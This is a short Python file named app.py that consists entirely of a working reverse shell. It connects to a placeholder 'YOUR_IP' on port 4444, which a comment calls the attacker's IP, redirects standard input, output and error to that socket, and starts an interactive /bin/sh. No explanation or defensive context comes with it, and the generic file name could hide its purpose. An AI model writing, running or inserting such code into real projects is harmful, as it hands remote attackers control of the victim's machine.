# app.py
import socket
import subprocess
import os

ip = "YOUR_IP"  # Replace with your listening IP
port = 4444      # Replace with your listening port

# Connect to the attacker's IP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

# Redirect input/output to the socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Start a shell
p = subprocess.call(["/bin/sh", "-i"])
